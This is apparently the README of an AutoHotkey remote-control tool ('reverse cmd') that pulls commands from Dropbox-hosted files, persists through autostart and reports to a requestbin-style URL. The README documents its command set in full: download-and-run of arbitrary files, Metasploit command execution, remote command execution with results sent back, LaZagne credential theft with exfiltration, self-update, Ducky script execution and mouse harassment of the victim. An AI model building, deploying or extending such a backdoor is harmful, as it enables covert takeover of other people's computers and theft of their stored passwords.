# Ahk-reverse-cmd

This is a reverse cmd using dropbox and ahk executables !!Alpha!!

syntax for file providing bin url (rquestbin or similar) (https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?dl=1)
[bin url];[number: auto copy into autostart]



syntax for file providing commands (https://www.dropbox.com/s/uj1id6b56tg7ex9/Reverse-cmd-command.txt?dl=1)

[command id]°[command(s)];[startup command]

command id: id of command, is checked on every code fetch, command is executed if it isn´t same as id on last code fetch or is 666

command(s): cmd/custom commands seperated each by a ^
-- for multiple cmd commands use && instead of ^ as it runs in only 1 cmd

startup command: command run on every startup of the programm, same syntax as standard command



syntax for metasploit file (https://www.dropbox.com/s/92u21ghy5t5v56c/Metasploit.txt?raw=1)

[cmd command]



Custom commands:
rvcmd <- prefix for custom commands

mouse [1|0] -- mouse annoy mode

printfile [url] -- download and print the (txt!) specified in the url

printtext [text] -- print the specified text

reportcycles [number repcycles] -- number of code fetches before auto reporting

speak [text] -- speaks the text using built in speech synthesis

idletime [time in s] -- time in s of user input inactivity before auto report (only reports on fetch cycles!)

urlrun [url] [filename/path with file extension] [Min|Max|Hide] -- download file from url and run it

metasploit -- run a metasploit command from a standard file

update [url] -- update programm from url

report -- report when still online

sendcon [command] -- execute command and send results

lazagne -- download lazagne, execute it and send results

unhook -- stop own process

cure -- delete file in autostart and stop own process

sleeptime [time in ms] -- delay between code fetches in ms -standard 10000

ducky [url] -- run ducky script from url
